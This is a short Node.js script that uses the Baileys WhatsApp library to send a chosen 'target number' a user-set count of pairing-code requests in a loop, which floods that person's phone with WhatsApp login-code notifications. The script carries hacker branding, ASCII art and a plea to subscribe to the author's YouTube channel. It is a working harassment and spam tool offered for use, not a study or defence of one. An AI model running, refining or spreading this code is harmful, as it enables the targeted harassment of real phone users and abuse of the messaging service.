const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require('pino');
const readline = require("readline");


    const color = [
        '\x1b[31m', 
        '\x1b[32m', 
        '\x1b[33m', 
        '\x1b[34m', 
        '\x1b[35m', 
        '\x1b[36m', 
        '\x1b[37m',
        '\x1b[90m' 
    ];
    const aviColor = color[Math.floor(Math.random() * color.length)];

const xColor = '\x1b[0m';

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => { rl.question(text, resolve) });
};

async function AviProject() {
    const { state } = await useMultiFileAuthState('./AviHack3r/session');
    const AviBotInc = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
    });
    try {
        // Ask for phone number
        const phoneNumber = await question(aviColor + 'Enter target number🤙 : ' + xColor);
        
        // Request the desired number of pairing codes
        const aviCodes = parseInt(await question(aviColor + 'Amount 😽 : '+ xColor));

        if (isNaN(aviCodes) || aviCodes <= 0) {
            console.log('example : 20.');
            return;
        }

        // Get and display pairing code
        for (let i = 0; i < aviCodes; i++) {
            try {
                let code = await AviBotInc.requestPairingCode(phoneNumber);
                code = code?.match(/.{1,4}/g)?.join("-") || code;
                console.log(aviColor + `${phoneNumber} [${i + 1}/${aviCodes}]`+ xColor);
            } catch (error) {
                console.error('Error:', error.message);
            }
        }
    } catch (error) {
                 console.error('error') ;
}

    return AviBotInc;
}
console.log(aviColor + `
     ╔═══╦╗──╔╦══╗                       …………..$……………………………………..$…………..
     ║╔═╗║╚╗╔╝╠╣╠╝                       …………$$……………………………………..$$…………
     ║║─║╠╗║║╔╝║║                        …………$$……………………………………..$$…………
     ║╚═╝║║╚╝║─║║                        …………..$$s………………………………s$$…………..
     ║╔═╗║╚╗╔╝╔╣╠╗                       …………….$$$$……………………….$$$$…………….
     ╚╝─╚╝─╚╝─╚══╝                       ………………³$$$$..¶¶¶¶¶¶¶¶..$$$$³………………
     ╔╗─╔╦═══╦═══╦╗╔═╦═══╦═══╗           ………………..³$$$$..¶¶¶¶¶¶..$$$$³………………..
     ║║─║║╔═╗║╔═╗║║║╔╣╔══╣╔═╗║           ………………¶..$$$$$..¶¶¶¶..$$$$$..¶………………
     ║╚═╝║║─║║║─╚╣╚╝╝║╚══╣╚═╝║           …………….¶¶¶..$$$..¶¶¶¶¶¶..$$$..¶¶………………
     ║╔═╗║╚═╝║║─╔╣╔╗║║╔══╣╔╗╔╝           …………….¶¶¶….¶¶¶¶¶¶¶¶¶¶….¶¶¶¶………………
     ║║─║║╔═╗║╚═╝║║║╚╣╚══╣║║╚╗           …………….¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶………………
     ╚╝─╚╩╝─╚╩═══╩╝╚═╩═══╩╝╚═╝           ………………..¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶………………..
                                         ………………..¶¶……..¶¶¶¶……….¶……………………
                                         ………………..¶¶……..¶¶¶¶……….¶¶………………….
                                         ………………..¶¶¶¶¶¶¶¶..¶¶¶¶¶¶¶¶………………….
                                         ………………….¶¶¶¶¶¶……¶¶¶¶¶¶¶………………….
                                         ……………………….¶¶¶¶¶¶¶¶¶…………………………
                                         ……………………….¶..¶..¶..¶..¶…………………………
    REAL KING AVISHKA SHAVINDA           …………¶…………..¶…………..¶…………..¶…………..
                                         ……….¶¶……………………………………….¶¶…………
DON'T FROGET SUBSCRIBE MY YOUTUBE CHANEL ……….¶¶……………………………………….¶¶…………
                                         ……….¶¶…………..¶¶……….¶¶…………..¶¶…………
                                         ……….¶¶..¶¶..¶¶..¶…………..¶..¶¶..¶¶..¶¶…………
                                         ……¶..¶¶..¶¶..¶¶..¶…………..¶..¶¶..¶¶..¶¶..¶……..
                                         ….¶¶..¶¶..¶¶..¶¶..¶…………..¶..¶¶..¶¶..¶¶..¶¶……
                                         ……¶¶¶¶..¶¶..¶¶………………….¶¶..¶¶..¶¶¶¶……..                          

    ` + xColor);

AviProject();